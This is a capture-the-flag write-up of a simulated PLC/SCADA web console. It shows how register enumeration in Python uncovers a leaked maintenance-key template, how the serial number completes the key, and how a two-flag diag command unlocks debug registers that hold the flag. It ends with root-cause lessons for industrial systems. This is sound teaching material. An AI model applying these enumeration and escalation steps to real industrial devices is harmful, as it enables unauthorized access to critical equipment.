# Baud Intentions — CTF Writeup

**Category:** Hardware / Web
**Points:** 10
**Target:** `http://0.cloud.chals.io:25381`

## Challenge Description

> A legacy industrial interface is still online, and it reveals more than it should.
> Explore the system, understand how it works, and see what you can recover.

## Overview

The challenge presents a browser-based terminal emulating a **PLCTERM-4 / SCADA-7** industrial
PLC console over a simulated UART link. Commands are typed into a web UI, which POSTs them as
JSON to a Flask backend at `/cmd` and renders the returned lines. The goal is to escalate from an
unauthenticated session to a maintenance/debug mode that exposes a hidden flag.

## Recon

Available commands (`help`):

```
sysinfo   status   diag [flags]   mem   auth <key>   read <register>   clear   help
```

`sysinfo` revealed basic device info:

```
DEVICE    : PLCTERM-4 / SCADA-7 Node
FIRMWARE  : 2.3.1-OT (Build 20240307)
SERIAL    : SN-7743-ALPHA
MAINT     : LOCKED
```

`mem` showed the register map:

```
0x00-0x0F  System control
0x10-0x1F  Sensor inputs
0x20-0x2F  Coil outputs
0x40-0x49  Runtime telemetry
0x4A-0x4C  Reserved
0x4D-0x4F  Maintenance/debug [LOCKED]
0x50-0x7F  User config
```

`status` only showed a curated subset of the `0x40-0x49` telemetry range, and `diag` always
failed with `Error: unauthenticated session`.

## Step 1 — Finding the auth key

Rather than guessing values for `auth <key>`, the unread registers in the documented
`0x40-0x49` "Runtime telemetry" range were enumerated directly, since `status` had only shown
a few of them:

```python
import requests
BASE = "http://0.cloud.chals.io:25381/cmd"

for i in range(0x40, 0x4A):
    reg = f"0x{i:02X}"
    r = requests.post(BASE, json={"command": f"read {reg}"})
    print(reg, "->", r.json()["lines"])
```

Register **`0x48`** leaked a template credential that the status screen deliberately omitted:

```
0x48 -> LEGACY_SERVICE_KEY: MAINT-<UNIT>
```

`<UNIT>` was filled in using the device serial number already shown in `sysinfo`
(`SN-7743-ALPHA` → unit `7743`), giving the candidate key:

```
MAINT-7743
```

```
auth MAINT-7743
```

✅ **Accepted.**

## Step 2 — Unlocking the debug registers

Authentication alone wasn't enough — `read 0x4D/0x4E/0x4F` now returned:

```
LOCKED — run diag sequence first.
```

and bare `diag` / `diag --raw` failed with:

```
Error: diagnostic mode requires explicit output options.
```

Both of `diag`'s documented flags turned out to be required **together**:

```
diag --verbose --raw
```

```
[DIAG] Running full diagnostic...
[DIAG] 0x01 .. CPU core integrity   PASS
[DIAG] 0x02 .. Flash checksum        PASS
[DIAG] 0x10 .. Pressure register     PASS
[DIAG] 0x12 .. Temp register         PASS
[DIAG] 0x4D .. Debug buffer A        UNLOCKED
[DIAG] 0x4E .. Debug buffer B        UNLOCKED
[DIAG] 0x4F .. Debug buffer C        UNLOCKED
[DIAG] Done. Maintenance/debug range accessible.
```

## Step 3 — Reading the flag

With the debug range unlocked, each buffer held a chunk of the flag as raw hex / ASCII:

```python
for reg in ["0x4D", "0x4E", "0x4F"]:
    r = s.post(BASE, json={"command": f"read {reg}"})
    print(reg, "->", r.json()["lines"])
```

```
0x4D — Debug buffer A: KPMG_CTF{B-1NcqX9w
0x4E — Debug buffer B: yLheqD0fa7-DnW6BJf
0x4F — Debug buffer C: gEajnJxF5ehQPDo_u}
```

Concatenating buffers A → B → C in register order reconstructs the full flag.

## Flag

```
KPMG_CTF{B-1NcqX9wyLheqD0fa7-DnW6BJfgEajnJxF5ehQPDo_u}
```

## Root Cause / Lessons

- **Information disclosure via an "undocumented" but readable register** (`0x48`) exposed a
  service credential template that should never have been readable pre-auth.
- The device serial number, displayed openly in `sysinfo`, was sufficient to complete the
  credential template — a real-world instance of a hardcoded/derivable maintenance key.
- Authentication alone did not gate the sensitive data; a secondary "diagnostic unlock" step
  (`diag --verbose --raw`) was also required, modeling a multi-stage privilege escalation
  common in legacy ICS/SCADA equipment.
- Classic lesson for OT/industrial systems: legacy maintenance interfaces often "reveal more
  than they should" through verbose status/telemetry commands that leak credentials or debug
  data to any connected client, authenticated or not.
